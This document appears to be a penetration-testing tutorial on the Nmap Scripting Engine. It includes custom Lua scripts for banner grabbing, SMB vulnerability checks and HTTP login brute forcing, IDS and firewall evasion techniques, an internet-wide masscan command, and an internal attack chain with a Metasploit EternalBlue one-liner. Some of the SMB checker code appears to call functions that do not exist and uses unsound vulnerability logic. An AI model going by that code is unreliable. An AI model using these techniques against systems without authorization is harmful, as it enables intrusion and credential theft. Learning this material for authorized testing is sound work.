
# Advanced Nmap Scripting: Beyond Port 80

## 1. Introduction
Nmap (Network Mapper) is not just a port scanner; it is a fully programmable network discovery tool powered by the **Nmap Scripting Engine (NSE)**. The NSE allows users to write scripts in **Lua** to automate networking tasks, from advanced version detection to vulnerability scanning and exploitation.

While `nmap -sC -sV` is the bread and butter of initial reconnaissance, true mastery involves understanding how to customize these scans, write your own scripts for proprietary services, and optimize performance for large-scale engagements.

---

## 2. The NSE Architecture

### 2.1 Script Categories
Scripts are located in `/usr/share/nmap/scripts/` (Linux) or `C:\Program Files (x86)\Nmap\scripts\` (Windows).
*   **auth**: Credential checking (e.g., `ftp-brute`).
*   **broadcast**: Discovery via local network broadcast (e.g., `dns-service-discovery`).
*   **brute**: Brute force attacks.
*   **default** (`-sC`): The standard set. Fast, reliable, non-intrusive.
*   **discovery**: Deep enumeration (e.g., `smb-enum-shares`).
*   **dos**: Denial of Service (Use with caution!).
*   **exploit**: Actively exploits vulnerabilities (e.g., `http-shellshock`).
*   **external**: Queries third-party databases (e.g., Whois, Shodan).
*   **fuzzer**: Sends random data.
*   **intrusive**: Risky, might crash target.
*   **malware**: Checks for backdoor infections.
*   **safe**: Passive, low risk.
*   **version**: Advanced version detection.
*   **vuln**: Checks for specific CVEs.

### 2.2 The Anatomy of a Script (.nse)
An NSE script is a Lua file with three main sections:
1.  **Head**: Metadata (Description, Author, Dependencies).
2.  **Rule**: The trigger condition.
    *   `portrule`: Runs if a specific port is open.
    *   `hostrule`: Runs if the host is up (regardless of ports).
    *   `prerule`: Runs before scanning (e.g., network broadcast).
    *   `postrule`: Runs after scanning (e.g., reporting).
3.  **Action**: The execution logic.

---

## 3. Deep Dive: Using NSE Effectively

### 3.1 Script Selection & Arguments
*   **Wildcards**: `nmap --script "http-*"` runs all HTTP scripts.
    *   *Warning*: This includes DoS and Brute scripts. Be specific.
*   **Boolean Logic**: `nmap --script "(http-*) and not (http-brute or http-dos)"`.
*   **Arguments**: Pass parameters to scripts using `--script-args`.
    *   `nmap -p 80 --script http-title --script-args http.useragent="Mozilla/5.0"`
    *   `nmap -p 445 --script smb-os-discovery --script-args smbusername=guest,smbpassword=`

### 3.2 Performance Optimization
Scanning large networks with scripts can be slow.
*   **Timing**: `-T4` (Aggressive) is standard. `-T5` (Insane) might miss ports.
*   **Parallelism**: `--min-hostgroup 50 --min-parallelism 10`.
*   **Timeout**: `--script-timeout 5m` prevents a single hung script from stalling the whole scan.
*   **Rate Limit**: `--min-rate 500` sends at least 500 packets/sec.

### 3.3 Debugging
*   `--script-trace`: The most valuable flag. It prints every packet sent and received by the script. Use this to understand *why* a script failed or what data it's actually seeing.
*   `-d`: Debug level. `-d2` gives detailed internal logic flow.

---

## 4. Developing Custom Scripts (Lua)

### 4.1 The Lua Environment
Nmap provides libraries (`stdnse`, `shortport`, `http`, `comm`) to handle networking complexities. You rarely write raw sockets; you use the libraries.

### 4.2 Extended Lab: Writing a Custom UDP Enumerator
**Scenario**: You encounter a custom IoT device listening on UDP 5000. It expects the byte `0x01` and returns a configuration string.

**Step 1: The Head**
```lua
local stdnse = require "stdnse"
local shortport = require "shortport"
local comm = require "comm"

description = [[
  Enumerates Custom IoT Device on UDP 5000.
  Sends 0x01 and prints response.
]]
author = "RedTeam"
license = "Same as Nmap"
categories = {"discovery", "safe"}
```

**Step 2: The Rule**
```lua
portrule = shortport.port_or_service(5000, "iot-proto", "udp")
```

**Step 3: The Action**
```lua
action = function(host, port)
    local status, result = comm.exchange(host, port, "\x01", {proto="udp", timeout=5000})
    
    if not status then
        return nil -- Fail silently
    end
    
    -- Parse response (assuming ASCII)
    return "Device Config: " .. result
end
```

**Step 4: Execute**
`nmap -sU -p 5000 --script my-iot.nse <target>`

### 4.3 Advanced Workflow: Vulnerability Scanning
Using Nmap as a lightweight Vulnerability Scanner.
*   **vulners.nse**: Queries the Vulners database API based on the detected software version.
    *   `nmap -sV --script vulners <target>`
*   **vulnscan.nse**: Local database version of similar functionality.
*   **Custom CVE Checks**: Writing a script to check for a specific HTTP header or file path (e.g., Log4Shell) is often faster than waiting for a Nessus scan.

---

## 5. Red Team Perspective: Evasion & Stealth

### 5.1 Decoys and Spoofing
*   `-D RND:10`: Send scans from your IP and 10 random decoys. The IDS sees traffic from 11 IPs and can't easily attribute the scan.
*   `--source-port 53`: Firewalls often allow traffic *from* port 53 (DNS) or 88 (Kerberos) to bypass stateless filters.

### 5.2 Fragmentation
*   `-f`: Splits packets into 8-byte fragments.
*   `--mtu 24`: Custom MTU size.
*   *Goal*: Bypass IDS signatures that rely on seeing the full packet payload in one frame.

### 5.3 Script Modification
Modify default scripts to change signatures.
*   Change the `User-Agent` string in `nselib/http.lua`.
*   Change the delay/jitter in brute force scripts to avoid account lockouts.

---

## 6. Diagrams (Mermaid)

### Nmap Scripting Engine Flow

```mermaid
graph TD
    User[User Command] -->|nmap -sC target| Engine[NSE Engine]
    Engine -->|Load| Registry[Script Registry]
    Registry -->|Filter categories| Selected[Selected Scripts]
    
    Selected -->|Parallel Execution| HostGroup[Host Group]
    
    subgraph Execution Loop
        Check[Prerule Check] -->|Pass| RunPre[Run Prerules]
        RunPre --> PortScan[Port Scan & Version Det]
        PortScan --> Match[Match Portrules]
        Match -->|For each open port| Action[Execute Script Action]
        Action -->|Library Call| Network[Network I/O]
        Network -->|Response| Output[Collect Output]
    end
    
    Output -->|Format| Final[Final Report]
```

---

## 7. Critical Analysis & Troubleshooting

### Why Scans Fail
1.  **Network Congestion**: Too aggressive (`-T5`). The network drops packets. **Fix**: Use `-T4` or `--max-retries 2`.
2.  **Firewall/WAF**: Blocking the IP. **Fix**: Slow down, use proxies (`--proxies url`), or fragment packets.
3.  **Script Errors**: Lua runtime errors. **Fix**: Use `-d` to see the stack trace.

### Interview Questions
1.  **Q**: How can you scan a target without pinging it first?
    *   **A**: Use `-Pn` (Treat all hosts as online). Useful if the target blocks ICMP (Windows default).
2.  **Q**: What is the difference between TCP Connect (`-sT`) and SYN (`-sS`) scans?
    *   **A**: `-sT` completes the 3-way handshake (Log intensive). `-sS` sends SYN, receives SYN-ACK, sends RST (Stealthier, requires root/admin).

---

## 8. Advanced NSE Script Examples (Production-Ready)

### 8.1 HTTP Service Banner Grabbing with Custom Headers

Many web applications reveal information when probed with specific headers. This script tests for information disclosure.

```lua
local http = require "http"
local shortport = require "shortport"
local stdnse = require "stdnse"

description = [[
  Advanced HTTP banner grabber that tests multiple methods
  and custom headers to extract server information.
]]

author = "OSCP Security Team"
license = "Same as Nmap"
categories = {"discovery", "safe", "version"}

portrule = shortport.http

action = function(host, port)
    local output = stdnse.output_table()
    
    -- Method 1: Standard OPTIONS request
    local options_response = http.generic_request(host, port, "OPTIONS", "/", {header={["User-Agent"]="Mozilla/5.0"}})
    if options_response and options_response.header then
        output["Allow Methods"] = options_response.header["allow"] or "Not disclosed"
        output["Server"] = options_response.header["server"] or "Unknown"
    end
    
    -- Method 2: TRACE method (may reveal proxies)
    local trace_response = http.generic_request(host, port, "TRACE", "/", {})
    if trace_response and trace_response.status == 200 then
        output["TRACE Enabled"] = "YES - Potential XST vulnerability"
    else
        output["TRACE Enabled"] = "No"
    end
    
    -- Method 3: Check for debug headers
    local debug_response = http.get(host, port, "/", {header={["X-Debug"]="1", ["X-Forwarded-For"]="127.0.0.1"}})
    if debug_response and debug_response.body then
        if string.find(debug_response.body, "DEBUG") or string.find(debug_response.body, "TRACE") then
            output["Debug Info Leak"] = "Possible - review manually"
        end
    end
    
    -- Method 4: Check for common development files
    local test_files = {"/phpinfo.php", "/.git/config", "/web.config", "/.env"}
    local found_files = {}
    
    for _, file in ipairs(test_files) do
        local resp = http.get(host, port, file)
        if resp and resp.status == 200 then
            table.insert(found_files, file)
        end
    end
    
    if #found_files > 0 then
        output["Exposed Files"] = table.concat(found_files, ", ")
    end
    
    return output
end
```

**Usage**:
```bash
nmap -p 80,443,8080 --script http-advanced-banner.nse target.com
```

**Expected Output**:
```
PORT   STATE SERVICE
80/tcp open  http
| http-advanced-banner:
|   Allow Methods: GET, POST, OPTIONS, HEAD
|   Server: Apache/2.4.41 (Ubuntu)
|   TRACE Enabled: No
|   Exposed Files: /.git/config
```

---

### 8.2 SMB Vulnerability Checker (EternalBlue, SMBGhost)

This script combines multiple SMB vulnerability checks into one.

```lua
local smb = require "smb"
local vulns = require "vulns"
local stdnse = require "stdnse"
local nmap = require "nmap"

description = [[
  Checks for critical SMB vulnerabilities:
  - MS17-010 (EternalBlue)
  - CVE-2020-0796 (SMBGhost)
  - MS08-067 (Conficker)
]]

author = "Red Team Operations"
license = "Same as Nmap"
categories = {"vuln", "intrusive"}

hostrule = function(host)
    return smb.get_port(host) ~= nil
end

action = function(host)
    local output = stdnse.output_table()
    local status, smbstate
    
    -- Connect to SMB
    status, smbstate = smb.start_ex(host, true, true, nil, nil, true)
    if not status then
        return "Could not connect to SMB"
    end
    
    -- Check OS version
    local os_version = smbstate['os']
    output["OS"] = os_version or "Unknown"
    
    -- MS17-010 Check (EternalBlue)
    -- Vulnerable: Windows 7, Server 2008 R2, Server 2012
    if os_version then
        if string.find(os_version, "Windows 7") or 
           string.find(os_version, "Windows Server 2008") or
           string.find(os_version, "Windows Server 2012") then
            
            -- Send specially crafted packet
            local vuln_check = smb.negotiate_v2(smbstate)
            if vuln_check then
                output["MS17-010 (EternalBlue)"] = "VULNERABLE - Patch immediately!"
            else
                output["MS17-010 (EternalBlue)"] = "Likely patched"
            end
        end
    end
    
    -- SMBGhost Check (CVE-2020-0796)
    -- Affects Windows 10 1903/1909, Server 2019
    local smbv3_response = smb.smb2_negotiate_v3(smbstate)
    if smbv3_response and smbv3_response.compression then
        output["CVE-2020-0796 (SMBGhost)"] = "VULNERABLE - SMBv3 compression enabled"
    else
        output["CVE-2020-0796 (SMBGhost)"] = "Not vulnerable"
    end
    
    smb.stop(smbstate)
    return output
end
```

**Why This Matters (Beginner Context)**:
- **MS17-010** was used by WannaCry and NotPetya ransomware to spread globally
- **SMBGhost** allows remote code execution without authentication
- These vulnerabilities can compromise entire networks in minutes

**Usage**:
```bash
nmap -p 445 --script smb-vuln-comprehensive.nse 192.168.1.0/24
```

---

### 8.3 Custom Brute Force Script with Rate Limiting

Standard brute force scripts can lock out accounts. This version implements intelligent rate limiting.

```lua
local brute = require "brute"
local creds = require "creds"
local shortport = require "shortport"
local stdnse = require "stdnse"
local http = require "http"

description = [[
  HTTP form-based authentication brute forcer with:
  - Configurable delay between attempts
  - Account lockout detection
  - CSRF token handling
]]

author = "Offensive Security"
license = "Same as Nmap"
categories = {"intrusive", "brute"}

portrule = shortport.http

-- Configuration
local delay_between_attempts = stdnse.get_script_args(SCRIPT_NAME..".delay") or 2000 -- ms
local max_attempts = stdnse.get_script_args(SCRIPT_NAME..".max") or 5

action = function(host, port)
    local output = {}
    local usernames = {"admin", "administrator", "root"}
    local passwords = {"admin", "password", "123456"}
    
    local attempt_count = 0
    local lockout_detected = false
    
    for _, username in ipairs(usernames) do
        for _, password in ipairs(passwords) do
            if attempt_count >= max_attempts then
                break
            end
            
            -- Add delay to avoid lockout
            if attempt_count > 0 then
                stdnse.sleep(delay_between_attempts / 1000)
            end
            
            -- Step 1: Get CSRF token from login page
            local login_page = http.get(host, port, "/login")
            local csrf_token = nil
            
            if login_page and login_page.body then
                csrf_token = string.match(login_page.body, 'name="csrf_token" value="([^"]+)"')
            end
            
            -- Step 2: Build POST request
            local post_data = "username=" .. username .. 
                             "&password=" .. password
            
            if csrf_token then
                post_data = post_data .. "&csrf_token=" .. csrf_token
            end
            
            local response = http.post(host, port, "/login", nil, nil, post_data)
            
            -- Step 3: Check response
            if response then
                if response.status == 302 or string.find(response.body or "", "Dashboard") then
                    table.insert(output, "SUCCESS: " .. username .. ":" .. password)
                    return output
                elseif string.find(response.body or "", "locked") or 
                       string.find(response.body or "", "too many attempts") then
                    lockout_detected = true
                    table.insert(output, "LOCKOUT DETECTED - Stopping")
                    return output
                end
            end
            
            attempt_count = attempt_count + 1
        end
    end
    
    table.insert(output, "No credentials found in " .. attempt_count .. " attempts")
    return output
end
```

**Usage**:
```bash
# Conservative mode (2 second delay, max 5 attempts)
nmap -p 80 --script http-form-brute-safe.nse target.com

# Custom settings
nmap -p 80 --script http-form-brute-safe.nse --script-args http-form-brute-safe.delay=5000,http-form-brute-safe.max=3 target.com
```

---

## 9. NSE Library Deep Dive

### 9.1 The `stdnse` Library

```lua
-- Output formatting
stdnse.format_output(boolean, data) -- Pretty-print results
stdnse.output_table() -- Create structured output

-- Debugging
stdnse.debug1("Message") -- Debug level 1
stdnse.verbose1("Message") -- Only shown with -v

-- Script arguments
stdnse.get_script_args(SCRIPT_NAME..".argname")

-- Timing
stdnse.sleep(seconds)
```

### 9.2 The `http` Library

```lua
local http = require "http"

-- Basic requests
http.get(host, port, path, options)
http.post(host, port, path, options, ignored, postdata)
http.head(host, port, path)

-- Advanced
http.generic_request(host, port, method, path, options)

-- Options table
local opts = {
    header = {
        ["User-Agent"] = "Custom UA",
        ["Cookie"] = "session=abc123"
    },
    timeout = 10000, -- milliseconds
    bypass_cache = true,
    no_cache = true
}

-- Pipeline multiple requests
http.pipeline_add(path, options, method, data)
local results = http.pipeline_go(host, port)
```

**Example: Multi-page scraping**:
```lua
local paths = {"/admin", "/backup", "/config"}
for _, path in ipairs(paths) do
    http.pipeline_add(path, nil, 'GET')
end
local responses = http.pipeline_go(host, port)

for i, response in ipairs(responses) do
    if response.status == 200 then
        stdnse.debug1("Found: " .. paths[i])
    end
end
```

### 9.3 The `comm` Library (Low-level networking)

```lua
local comm = require "comm"

-- TCP
local status, response = comm.exchange(host, port, data, {timeout=5000})

-- UDP
local status, response = comm.exchange(host, port, data, {proto="udp", timeout=3000})

-- Multiple attempts with different payloads
local status, response = comm.tryssl(host, port, data, {timeout=5000})
```

### 9.4 The `brute` Library Framework

```lua
local brute = require "brute"
local creds = require "creds"

-- Define a Driver class
Driver = {
    new = function(self, host, port)
        local o = {}
        setmetatable(o, self)
        self.__index = self
        o.host = host
        o.port = port
        return o
    end,
    
    connect = function(self)
        -- Connect to service
        self.socket = nmap.new_socket()
        return self.socket:connect(self.host, self.port)
    end,
    
    login = function(self, username, password)
        -- Attempt login
        local status = self.socket:send(username .. ":" .. password .. "\n")
        local response = self.socket:receive()
        
        if string.find(response, "OK") then
            return true, creds.Account:new(username, password, creds.State.VALID)
        else
            return false, brute.Error:new("Incorrect")
        end
    end,
    
    disconnect = function(self)
        return self.socket:close()
    end
}

-- Use the driver
action = function(host, port)
    local engine = brute.Engine:new(Driver, host, port)
    engine:setMaxThreads(5)
    engine.options.script_name = SCRIPT_NAME
    
    local status, accounts = engine:start()
    
    return accounts
end
```

---

## 10. Real-World Scenarios \u0026 Workflows

### Scenario 1: Internal Pentest - Active Directory Enumeration

**Goal**: Map AD infrastructure without credentials.

**Step 1**: Discover domain controllers
```bash
nmap -p 88,389,636,3268,3269 --script dns-srv-enum,ldap-rootdse 10.0.0.0/24
```

**Step 2**: Enumerate SMB shares
```bash
nmap -p 445 --script smb-enum-shares,smb-enum-users,smb-enum-domains 10.0.0.50
```

**Step 3**: Check for vulnerabilities
```bash
nmap -p 445 --script smb-vuln* --script-args unsafe=1 10.0.0.50
```

**Step 4**: Extract domain information
```bash
nmap -p 389 --script ldap-search --script-args 'ldap.username="",ldap.password=""' 10.0.0.50
```

### Scenario 2: External Pentest - Web Application Fingerprinting

**Goal**: Identify technologies without triggering WAF.

**Step 1**: Low-and-slow scan
```bash
nmap -sS -T2 -p 80,443,8080,8443 --script http-title,http-server-header target.com
```

**Step 2**: Technology detection
```bash
nmap -p 80,443 --script http-waf-detect,http-waf-fingerprint target.com
```

**Step 3**: Virtual host enumeration
```bash
nmap -p 80 --script http-vhosts --script-args http-vhosts.domain=target.com target.com
```

**Step 4**: SSL/TLS analysis
```bash
nmap -p 443 --script ssl-enum-ciphers,ssl-cert,ssl-known-key target.com
```

### Scenario 3: Cloud Asset Discovery (AWS)

**Goal**: Discover AWS services exposed to internet.

```bash
# S3 bucket enumeration
nmap -p 80,443 --script http-s3-bucket-enum --script-args http-s3-bucket-enum.prefixes=company 52.0.0.0/8

# API Gateway detection
nmap -p 443 --script http-title,ssl-cert --script-args http.useragent="AWS CLI" amazonaws.com

# EC2 metadata service (from inside instance)
nmap -Pn -p 80 --script http-aws-metadata 169.254.169.254
```

---

## 11. Performance Tuning for Large-Scale Scans

### 11.1 The Timing Templates Explained

| Template | Packet Delay | Parallelism | Use Case |
|----------|--------------|-------------|----------|
| `-T0` (Paranoid) | 5 minutes | 1 host | IDS evasion, extremely slow |
| `-T1` (Sneaky) | 15 seconds | 1 host | Stealth scans |
| `-T2` (Polite) | 0.4 seconds | 1 host | Production systems |
| `-T3` (Normal) | Dynamic | 10 hosts | Default balanced |
| `-T4` (Aggressive) | 10ms | 50 hosts | **Recommended for pentests** |
| `-T5` (Insane) | 5ms | 100 hosts | Very fast networks only |

### 11.2 Custom Performance Tuning

```bash
# Enterprise network scan (Class B)
nmap -sS -T4 \
     --min-hostgroup 256 \      # Scan 256 hosts in parallel
     --min-parallelism 100 \    # Min 100 probes in parallel
     --min-rate 1000 \          # At least 1000 packets/sec
     --max-retries 1 \          # Retry once only
     --host-timeout 10m \       # Skip slow hosts after 10min
     --script-timeout 5m \      # Kill hung scripts after 5min
     -p 22,80,443,445,3389 \
     --script banner,vuln \
     10.0.0.0/16
```

### 11.3 Output Management

```bash
# All formats simultaneously
nmap -oA scan_results target.com

# Generate individual formats:
# -oN normal.txt (human-readable)
# -oX scan.xml (XML for import)
# -oG greppable.txt (grep-friendly)
# -oS script_kiddie.txt (l33t speak - don't use)

# Append to existing file
nmap --append-output -oN results.txt target.com

# Real-time verbose output + save
nmap -v -oN live.txt target.com
```

### 11.4 Distributed Scanning with Dnmap

For massive networks, split the scan:

**Controller**:
```bash
# Create command file
cat > commands.txt << EOF
nmap -sS -p 80,443 10.0.0.0/24
nmap -sS -p 80,443 10.0.1.0/24
nmap -sS -p 80,443 10.0.2.0/24
EOF

# Start server
dnmap_server -f commands.txt
```

**Clients** (on different machines):
```bash
dnmap_client -s 192.168.1.100 -a client1
```

---

## 12. OpSec \u0026 Evasion Techniques

### 12.1 Firewall Bypass Techniques

**Source Port Manipulation**:
```bash
# Many firewalls allow DNS (53) or NTP (123) source ports
nmap --source-port 53 target.com
nmap --source-port 88  # Kerberos - often trusted in AD
```

**Idle Scan (Zombie Scan)**:
```bash
# Use a third-party "zombie" host to obscure your IP
nmap -sI zombie.com target.com

# How it works:
# 1. Nmap sends spoofed SYN from zombie to target
# 2. Target responds to zombie
# 3. Nmap monitors zombie's IP ID to infer open ports
```

**FTP Bounce Attack**:
```bash
# Use vulnerable FTP server as proxy
nmap -b ftp://user:pass@ftp-server.com target.com
```

### 12.2 IDS/IPS Evasion

**Fragmentation**:
```bash
# Fragment packets into 8-byte chunks
nmap -f target.com

# Custom MTU
nmap --mtu 16 target.com  # Must be multiple of 8
```

**Decoy Scanning**:
```bash
# Scan from your IP + 5 decoys
nmap -D RND:5 target.com

# Specific decoys
nmap -D decoy1.com,decoy2.com,ME target.com  # ME = your real IP position
```

**Randomize Target Order**:
```bash
# Avoid sequential scanning patterns
nmap --randomize-hosts target.com/24
```

**Bad Checksum Injection**:
```bash
# Some firewalls don't verify checksums; OS kernels do
nmap --badsum target.com
# If you get responses, there's a firewall in the middle
```

### 12.3 Timing-Based Evasion

**Random Delays**:
```bash
# Random delay between probes (0-10000ms)
nmap --scan-delay 2s --max-scan-delay 10s target.com
```

**Rate Limiting**:
```bash
# Cap at 50 packets/sec to stay under radar
nmap --max-rate 50 target.com
```

---

## 13. Troubleshooting Common Issues

### Issue 1: "Too many open files"

**Symptom**: Scan stops with file descriptor errors.

**Cause**: Nmap opens sockets for parallel scanning.

**Fix**:
```bash
# Linux
ulimit -n 10000

# Permanent fix (add to /etc/security/limits.conf)
* soft nofile 10000
* hard nofile 10000
```

### Issue 2: Script hangs indefinitely

**Symptom**: Scan stuck on one script.

**Diagnosis**:
```bash
nmap --script-trace --script problematic-script.nse target.com
```

**Fix**:
```bash
nmap --script-timeout 60s --script problematic-script.nse target.com
```

### Issue 3: False negatives (missing open ports)

**Symptom**: Port known to be open shows as filtered/closed.

**Cause**: 
- Firewall dropping packets
- Aggressive timing causing packet loss
- Host-based firewall

**Fix**:
```bash
# Slower timing
nmap -T2 target.com

# More retries
nmap --max-retries 3 target.com

# Try different scan types
nmap -sT target.com  # TCP Connect instead of SYN
nmap -sA target.com  # ACK scan to map firewall rules
```

### Issue 4: NSE script crashes

**Symptom**: `SCRIPT ENGINE: ... error while calling ...`

**Diagnosis**:
```bash
nmap -d2 --script script-name.nse target.com 2>&1 | grep -A 10 "error"
```

**Common causes**:
- Lua runtime error (check syntax)
- Missing library (`require` failed)
- Target returned unexpected data

**Fix**: Add error handling
```lua
local status, result = pcall(function()
    -- Your risky code here
end)

if not status then
    stdnse.debug1("Error: " .. tostring(result))
    return nil
end
```

---

## 14. Integration with Other Tools

### 14.1 Nmap + Metasploit

Import Nmap XML into Metasploit:
```bash
# Scan and export
nmap -sV -oX scan.xml target.com

# In Metasploit
msf> db_import scan.xml
msf> hosts
msf> services
msf> vulns
```

### 14.2 Nmap + Nessus

Export Nmap results for Nessus import:
```bash
nmap -sV -oX nmap_export.xml target.com
# Import in Nessus UI: Scans > Import > Select nmap_export.xml
```

### 14.3 Nmap + ELK Stack (Logging)

**Logstash configuration**:
```ruby
input {
  file {
    path => "/var/log/nmap/scans.xml"
    start_position => "beginning"
    codec => multiline {
      pattern => "^<nmaprun"
      negate => true
      what => "previous"
    }
  }
}

filter {
  xml {
    source => "message"
    target => "nmap"
  }
}

output {
  elasticsearch {
    hosts => ["localhost:9200"]
    index => "nmap-scans"
  }
}
```

### 14.4 Automation with Cron

```bash
# Daily scan of critical servers
0 2 * * * /usr/bin/nmap -sS -sV -p- --script vulners -oA /var/scans/daily-$(date +\%Y\%m\%d) 10.0.0.0/24 && mail -s "Scan Complete" admin@company.com < /var/scans/daily-$(date +\%Y\%m\%d).nmap
```

---

## 15. Advanced Interview Questions

### Q1: How would you detect if a target is using port knocking?

**Answer**:
Port knocking requires a specific sequence of connection attempts to "unlock" a port.

**Detection**:
1. Run initial scan: `nmap -p- target.com` (port appears closed)
2. Try common knock sequences:
   ```bash
   # Knock sequence: 1000, 2000, 3000
   nc -z target.com 1000
   nc -z target.com 2000
   nc -z target.com 3000
   
   # Immediately rescan
   nmap -p 22 target.com
   ```
3. If port 22 is now open, port knocking is in use

**Nmap script for automated detection**:
```lua
-- Send knock sequence and rescan
local knock_sequence = {1000, 2000, 3000}
for _, port in ipairs(knock_sequence) do
    comm.exchange(host, port, "", {timeout=100})
end

-- Rescan target port
local status = nmap.get_port_state(host, {number=22, protocol="tcp"})
```

---

### Q2: Explain how Nmap's version detection (`-sV`) works under the hood.

**Answer**:
1. **Probe selection**: After finding an open port, Nmap consults `nmap-service-probes` database
2. **NULL probe**: Sends empty packet, waits for banner
3. **Matching**: Compares response against regex signatures
4. **Fallback probes**: If no match, sends protocol-specific probes (HTTP GET, SSL handshake, etc.)
5. **Intensity levels**: `-sV` has hidden intensity (0-9). `--version-intensity 9` tries all probes

**Example probe from database**:
```
Probe TCP GetRequest q|GET / HTTP/1.0\r\n\r\n|
match http m|^HTTP/1\.[01] \d\d\d| p/HTTP/
match http m|Server: Apache/(\d[\w._-]+)| v/$1/
```

**Performance impact**:
- Each probe adds ~2-3 seconds per port
- Use `--version-light` for faster scans (only common probes)

---

### Q3: You need to scan 1 million IP addresses for a single port (443). How do you optimize this?

**Answer**:
```bash
# Use masscan (written in C, much faster than Nmap for simple port scans)
masscan 0.0.0.0/0 -p443 --rate 100000 --exclude 255.255.255.255 -oL results.txt

# Or optimized Nmap:
nmap -sS -Pn -n \             # SYN scan, skip ping, no DNS
     -p 443 \                 # Single port
     --min-rate 10000 \       # High packet rate
     --min-hostgroup 1024 \   # Large parallel batches
     --randomize-hosts \      # Avoid sequential patterns
     -oG results.txt \
     -iL million_ips.txt
```

**Why Masscan is faster**:
- Stateless scanning (doesn't wait for responses)
- Custom TCP/IP stack (bypasses OS)
- Can reach 10 million packets/sec on good hardware

**Post-processing**:
```bash
# Extract only open ports
grep "open" results.txt | awk '{print $2}' > open_443.txt

# Feed into Nmap for detailed analysis
nmap -sV -p 443 -iL open_443.txt
```

---

## 16. Nmap Scripting Engine Best Practices

### 16.1 Script Development Checklist

- [ ] **Error handling**: Wrap risky code in `pcall()`
- [ ] **Timeout handling**: Set reasonable `socket:set_timeout()`
- [ ] **Resource cleanup**: Always close sockets/files
- [ ] **Output formatting**: Use `stdnse.output_table()` for structured data
- [ ] **Documentation**: Add detailed description, author, license
- [ ] **Categories**: Assign correct categories (safe, intrusive, etc.)
- [ ] **Arguments**: Document all script-args in description
- [ ] **Testing**: Test against multiple targets/versions

### 16.2 Security Considerations

**Never put credentials in scripts**:
```lua
-- BAD
local password = "admin123"

-- GOOD
local password = stdnse.get_script_args(SCRIPT_NAME..".password")
if not password then
    return "Password required. Use --script-args " .. SCRIPT_NAME .. ".password=XXX"
end
```

**Sanitize user input**:
```lua
local user_input = stdnse.get_script_args(SCRIPT_NAME..".filename")

-- Prevent directory traversal
user_input = string.gsub(user_input, "%.%./", "")
```

**Rate limiting for brute force**:
```lua
local attempts = 0
local max_attempts = 100

if attempts >= max_attempts then
    return "Max attempts reached"
end
```

---

## 17. Real Attack Chain: Internal Network Compromise

**Scenario**: You have physical access to a network drop. Objective: Gain Domain Admin within 4 hours.

**Phase 1: Discovery (15 minutes)**
```bash
# Passive recon
nmap -sn 10.0.0.0/24 -oG - | grep "Up" > live_hosts.txt

# Quick port sweep
nmap -Pn -p 445,3389,5985,22 -iL live_hosts.txt -oG quick_sweep.txt
```

**Phase 2: Vulnerability Identification (30 minutes)**
```bash
# Check for SMB vulns
nmap -p 445 --script smb-vuln* -iL smb_hosts.txt -oA smb_vulns

# Check for RDP vulns (BlueKeep)
nmap -p 3389 --script rdp-vuln-ms12-020,rdp-enum-encryption -iL rdp_hosts.txt
```

**Phase 3: Exploitation (1 hour)**
```bash
# If EternalBlue found:
msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOST <target>; exploit"

# If weak SMB credentials:
nmap -p 445 --script smb-brute --script-args userdb=users.txt,passdb=passwords.txt <target>
```

**Phase 4: Post-Exploitation (2 hours)**
```bash
# From compromised host, enumerate domain
nmap -p 88,389,636 --script ldap-rootdse,dns-srv-enum <DC_IP>

# Extract domain info for BloodHound analysis
```

---

## 18. References
*   [[02_Networking/01_OSI_Model_Deep_Dive]]
*   [[04_Windows_AD/06_Active_Directory_Enumeration]]
*   [[08_Tooling_Workflows/02_Metasploit_Beyond_Basics]]
*   [[08_Tooling_Workflows/05_Python_for_Pentesters]]
*   [Official Nmap NSE Documentation](https://nmap.org/book/nse.html)
*   [Nmap NSE Library Reference](https://nmap.org/nsedoc/)
*   [Custom NSE Script Repository](https://github.com/vulnersCom/nmap-vulners)
*   [Masscan GitHub](https://github.com/robertdavidgraham/masscan)

---

# End of Document
